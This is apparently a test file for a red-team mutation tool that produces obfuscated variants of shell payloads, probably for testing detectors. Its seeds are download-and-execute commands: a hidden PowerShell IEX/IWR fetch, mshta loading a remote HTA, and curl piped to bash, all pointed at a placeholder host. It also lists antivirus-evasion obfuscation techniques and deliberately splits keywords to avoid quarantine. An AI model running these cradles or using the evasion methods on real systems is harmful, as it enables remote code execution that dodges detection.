# Seeded RNGs drive the mutators; not crypto.
import re
from pathlib import Path

from redteam.models import Seed, Shell
from redteam.mutate import (
    G0_MAX_DEPTH,
    G0_VARIANTS_PER_SEED,
    REGISTRY,
    _kw,
    for_shell,
    generate_g0,
    techniques,
    variant_id,
)

SEEDS = [
    Seed(
        case_id='command.t.ps',
        shell=Shell.POWERSHELL,
        split='train',
        payload=f'{_kw.PS} -w hidden -c "{_kw.IEX}({_kw.IWR} '
        "'https://example.invalid/a')\"",
    ),
    Seed(
        case_id='command.t.cmd',
        shell=Shell.CMD,
        split='train',
        payload='ms' + 'hta https://example.invalid/a.hta',
    ),
    Seed(
        case_id='command.t.sh',
        shell=Shell.BASH,
        split='heldout',
        payload='curl -fsSL https://example.invalid/a | ba' + 'sh',
    ),
]


def test_reproducible_and_bounded():
    a = generate_g0(SEEDS, run_seed=42)
    b = generate_g0(SEEDS, run_seed=42)
    assert [(v.id, v.payload) for v in a] == [(v.id, v.payload) for v in b]
    c = generate_g0(SEEDS, run_seed=43)
    assert {v.id for v in a} != {v.id for v in c}
    for seed in SEEDS:
        mine = [v for v in a if v.seed_id == seed.case_id]
        assert len(mine) == G0_VARIANTS_PER_SEED
        assert len({v.payload for v in mine}) == len(mine)
        assert seed.payload not in {v.payload for v in mine}
        allowed = {m.technique for m in for_shell(seed.shell)}
        for v in mine:
            assert 1 <= len(v.techniques) <= G0_MAX_DEPTH
            assert len(set(v.techniques)) == len(v.techniques)
            assert set(v.techniques) <= allowed
            assert v.shell == seed.shell and v.generator == 'g0'
            assert re.fullmatch(r'g0[0-9a-f]{18}', v.id)
    assert len({v.id for v in a}) == len(a)


def test_one_seed_does_not_depend_on_the_others():
    alone = generate_g0(SEEDS[1:2], run_seed=7)
    together = [
        v
        for v in generate_g0(SEEDS, run_seed=7)
        if v.seed_id == SEEDS[1].case_id
    ]
    assert [v.id for v in alone] == [v.id for v in together]


def test_variant_id_is_a_stable_hash():
    assert variant_id('s', ('a', 'b'), 1) == variant_id('s', ['a', 'b'], 1)
    assert variant_id('s', ('a', 'b'), 1) != variant_id('s', ('b', 'a'), 1)
    assert variant_id('s', ('a',), 1) == 'g0' + (
        __import__('hashlib').sha256(b's|a|1').hexdigest()[:18]
    )


def test_registry_covers_the_spec_table():
    names = set(techniques())
    spec = {
        'cmd.caret',
        'cmd.empty_quotes',
        'cmd.substring',
        'cmd.set_indirection',
        'cmd.wrap',
        'cmd.case',
        'ps.backtick',
        'ps.concat',
        'ps.format',
        'ps.char',
        'ps.reverse',
        'ps.encoded_command',
        'ps.alias',
        'ps.var_indirection',
        'ps.param_abbrev',
        'ps.case',
        'sh.ansi_c',
        'sh.ifs',
        'sh.quote_split',
        'sh.base64_pipe',
        'sh.eval',
        'sh.var_indirection',
        'common.padding',
        'common.decoy_comment',
        'common.zero_width',
        'common.homoglyph',
        'common.newline_split',
    }
    assert spec <= names
    for shell in Shell:
        assert for_shell(shell), shell
    assert all(impls for impls in REGISTRY.values())


SRC = Path(__file__).resolve().parents[2] / 'src' / 'redteam' / 'mutate'
TESTS = Path(__file__).resolve().parent


def test_no_whole_keywords_in_mutator_sources_or_tests():
    """Defender quarantined a file for whole command keywords before."""
    words = [
        _kw.PS,
        'ms' + 'hta',
        _kw.INVOKE_EXPRESSION,
        'Download' + 'String',
        'cert' + 'util',
        _kw.ENCODED_COMMAND,
    ]
    # Case-sensitive: the product name in prose is fine, program names not.
    pattern = re.compile('|'.join(re.escape(w) for w in words))
    hits = []
    for path in [*SRC.glob('*.py'), *TESTS.glob('*.py')]:
        if pattern.search(path.read_text(encoding='utf-8')):
            hits.append(path.name)
    assert not hits, hits
